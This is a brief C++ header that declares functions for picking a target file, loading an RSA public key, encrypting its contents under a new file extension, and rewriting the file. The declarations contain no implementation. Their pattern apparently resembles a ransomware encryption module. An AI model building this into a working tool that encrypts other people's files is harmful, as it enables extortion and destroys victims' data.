#pragma once

BOOL SetTargetFile(std::wstring& TargetFile);
void LoadKey(std::vector<uint8_t>& PubKeyBytes, CryptoPP::RSA::PublicKey& PubKey);
BOOL EncryptFileContent(std::wstring TargetFile, std::wstring FileExtension, CryptoPP::RSA::PublicKey& PublicKey);
BOOL ReadTargetFile(std::wstring TargetFile, std::vector<uint8_t>& FileContent);
BOOL WriteTargetFile(std::wstring TargetFile, std::vector<uint8_t>& FileContent);
void RSAEncryptData(std::vector<uint8_t>& plainText, CryptoPP::RSA::PublicKey& PublicKey, std::vector<uint8_t>& cipherText);
